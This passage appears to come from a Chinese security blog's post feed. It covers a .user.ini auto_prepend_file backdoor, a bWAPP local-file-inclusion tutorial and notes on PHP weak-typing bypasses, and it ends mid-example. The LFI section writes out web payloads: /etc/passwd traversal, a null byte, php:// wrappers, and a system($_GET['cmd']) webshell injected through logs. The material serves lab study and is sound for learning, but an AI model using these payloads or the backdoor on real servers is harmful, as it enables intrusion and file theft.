<p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122046860.png" alt="image-20210616122046860"></p>
<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
<p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122108740.png" alt="image-20210616122108740"></p>
<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
<pre><code>auto_prepend_file=01.gif</code></pre>
<p>01.gif是要包含的文件。</p>
<p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p>
<p>原文<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:LFI漏洞</title>
    <url>/2021/06/09/web-lfi-lou-dong/</url>
    <content><![CDATA[<h3 id="0x01-基本本地文件包含"><a href="#0x01-基本本地文件包含" class="headerlink" title="0x01 基本本地文件包含"></a>0x01 基本本地文件包含</h3><p>在浏览器中输入目标IP，并在BWAPP内登录（bee：bug），现在选择bug：remote &amp; local file Inclusion，然后点击hack。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/1-1.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/1-1.png" alt="1-1"></a></p>
<p>打开具有RFI和LFI漏洞的网页。在下拉列表中选择语言释，单击go按钮时，所选的语言文件将包含在URL中。 执行基本攻击操作。</p>
<blockquote>
<p><a href="http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&amp;action=go">http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into 192.168.1.101/bWAPP/flfi.php?language=/etc/passwd</p>
</blockquote>
<p>在基本的LFI攻击中，我们可以使用（../）或简单地（/）从目录中直接<a href="https://www.secpulse.com/archives/tag/%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">读取文件</a>的内容，下面的截图中在浏览器URL中访问密码文件。</p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/02/2-1.png" alt="2-1"></p>
<h3 id="0x02-Null-byte"><a href="#0x02-Null-byte" class="headerlink" title="0x02 Null byte"></a>0x02 Null byte</h3><p>在一些情况下，由于高安全级别，上面提到的基本本地文件包含攻击可能不工作。从下面的截图可以观察到，当在URL中执行相同的路径时，却无法读取密码文件。 所以当面对这样的问题，可以进行NULL byte攻击。</p>
<p>打开burp suite捕获浏览器请求，然后选择代理选项卡并开始截取。 不要忘记在使用<a href="https://www.secpulse.com/archives/tag/burp">burp</a> suite时设置浏览器代理。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/3.1.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.1.png" alt="3.1"></a></p>
<p>将拦截的数据发送到<a href="https://www.secpulse.com/archives/tag/repeater">repeater</a>。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/3.2.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.2.png" alt="3.2"></a></p>
<p>在repeater中做发送的请求和响应生成的分析。从截图可以清楚的看出/ etc / passwd不能读取。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/3.3.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.3.png" alt="3.3"></a></p>
<p>在下面的截图中，通过在<a href="https://www.secpulse.com/archives/tag/etc/passwd">etc/passwd</a>目录的末尾添加空字符（％00）来转发请求，然后单击go选项卡。然后在窗口的右视图上，密码文件作为响应打开。</p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.4.png" alt="3.4"></p>
<h3 id="0x03-Base64-encoded"><a href="#0x03-Base64-encoded" class="headerlink" title="0x03 Base64 encoded"></a>0x03 Base64 encoded</h3><pre><code>php://filter/read=convert.base64-encode/resource=</code></pre>
<h3 id="0x04-PHP-Input"><a href="#0x04-PHP-Input" class="headerlink" title="0x04 PHP Input"></a>0x04 PHP Input</h3><pre><code>php://input&amp;cmd=ls</code></pre>
<p>然后post执行命令</p>
<pre><code>&lt;？php system（$ _ GET [‘cmd’]）; ？&gt;</code></pre>
<h3 id="0x05-Proc-self-environ"><a href="#0x05-Proc-self-environ" class="headerlink" title="0x05 Proc/self/environ"></a>0x05 Proc/self/environ</h3><p>如果服务超时，通过LFI利用它。可以包括存储User_Agent的proc/self/environ文件，在文件中插入用于执行CMD命令的PHP代码。</p>
<p>CMD命令<code>&lt;?php system($_GET[‘cmd’]); ?&gt;</code>添加到user_Agent内，并使用GET参数<strong>192.168.1.8/lfi/lfi.php?file=/var/www/apachae2/access.log&amp;cmd=id</strong>发送请求</p>
<p>参考：<a href="https://www.cnblogs.com/wh4am1/p/6542398.html">https://www.cnblogs.com/wh4am1/p/6542398.html</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:PHP弱类型</title>
    <url>/2021/06/14/web-php-ruo-lei-xing/</url>
    <content><![CDATA[<h1 id="0x01：“-”和“-”"><a href="#0x01：“-”和“-”" class="headerlink" title="0x01：“==”和“===”"></a><strong>0x01：“==”和“===”</strong></h1><p>php中有两种比较的符号 == 与 ===</p>
<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p><strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//true</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"1admin"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin1"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//false</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin1"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"0e123456"</span><span class="token operator">==</span><span class="token string">"0e4456789"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true </span>
<span class="token delimiter">?></span>  <span class="token comment" spellcheck="true">//上述代码可自行测试</span></code></pre>
<p> <strong>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">"10.5"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $test=11.5(float)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"-1.3e3"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$test=-1299(float)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"bob-1.3e3"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$test=1(int)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"2admin"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$test=3(int)</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string">"admin2"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$test=1(int)</span>
<span class="token delimiter">?></span></code></pre>
<h3 id="使用-PHP-函数对变量-x-进行比较"><a href="#使用-PHP-函数对变量-x-进行比较" class="headerlink" title="使用 PHP 函数对变量 $x 进行比较"></a><strong>使用 PHP 函数对变量 $x 进行比较</strong></h3><table>
<thead>
<tr>
<th>表达式</th>
<th><a href="https://www.php.net/manual/zh/function.gettype.php">gettype()</a></th>
<th><a href="https://www.php.net/manual/zh/function.empty.php">empty()</a></th>
<th><a href="https://www.php.net/manual/zh/function.is-null.php">is_null()</a></th>
<th><a href="https://www.php.net/manual/zh/function.isset.php">isset()</a></th>
<th>boolean : <code>if($x)</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>$x = "";</code></td>
<td>string</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = null;</code></td>
<td>NULL</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>var $x;</code></td>
<td>NULL</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td>$x is undefined</td>
<td>NULL</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = array();</code></td>
<td>array</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = array('a', 'b');</code></td>
<td>array</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = false;</code></td>
<td>boolean</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = true;</code></td>
<td>boolean</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = 1;</code></td>
<td>integer</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = 42;</code></td>
<td>integer</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = 0;</code></td>
<td>integer</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = -1;</code></td>
<td>integer</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "1";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "0";</code></td>
<td>string</td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>$x = "-1";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "php";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "true";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>$x = "false";</code></td>
<td>string</td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
</tbody></table>
<h3 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较 =="></a><strong>松散比较 <code>==</code></strong></h3><table>
<thead>
<tr>
<th></th>
<th><strong><code>true</code></strong></th>
<th><strong><code>false</code></strong></th>
<th><code>1</code></th>
<th><code>0</code></th>
<th><code>-1</code></th>
<th><code>"1"</code></th>
<th><code>"0"</code></th>
<th><code>"-1"</code></th>
<th><strong><code>null</code></strong></th>
<th><code>array()</code></th>
<th><code>"php"</code></th>
<th><code>""</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>1</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>0</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>-1</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"1"</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"0"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"-1"</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>null</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
<tr>
<td><code>array()</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"php"</code></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>""</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
</tbody></table>
<h3 id="严格比较"><a href="#严格比较" class="headerlink" title="严格比较 ==="></a><strong>严格比较 <code>===</code></strong></h3><table>
<thead>
<tr>
<th></th>
<th><strong><code>true</code></strong></th>
<th><strong><code>false</code></strong></th>
<th><code>1</code></th>
<th><code>0</code></th>
<th><code>-1</code></th>
<th><code>"1"</code></th>
<th><code>"0"</code></th>
<th><code>"-1"</code></th>
<th><strong><code>null</code></strong></th>
<th><code>array()</code></th>
<th><code>"php"</code></th>
<th><code>""</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>true</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>1</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>0</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>-1</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"1"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"0"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"-1"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><strong><code>null</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>array()</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"php"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>""</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
</tbody></table>
<h2 id="0x02-”array-search”与is-array”绕过"><a href="#0x02-”array-search”与is-array”绕过" class="headerlink" title="0x02:”array_search”与is_array”绕过"></a>0x02:”array_search”与is_array”绕过</h2><p>is_array:判断传入的是不是一个数组，array_search（x，$数组）:在数组中寻找与指定值(x)相等的值，array_search函数 类似于”==”，会进行类型的转换</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"false"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>在上面的栗子中，我们可以传入test[]=0来进行绕过，首先test是一个数组，符合is_array的判断，然后test=0；在array_search中0==admin为true，绕过了array_search。</p>
<h2 id="0x03：strcmp漏洞绕过"><a href="#0x03：strcmp漏洞绕过" class="headerlink" title="0x03：strcmp漏洞绕过"></a>0x03：strcmp漏洞绕过</h2><p>strcmp是比较两个字符串，str1&lt;str2，返回&lt;0，str1&gt;str2,返回&gt;0,相等时返回等于0</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"***************"</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           <span class="token keyword">echo</span> <span class="token string">"Right!!!login success"</span><span class="token punctuation">;</span>n
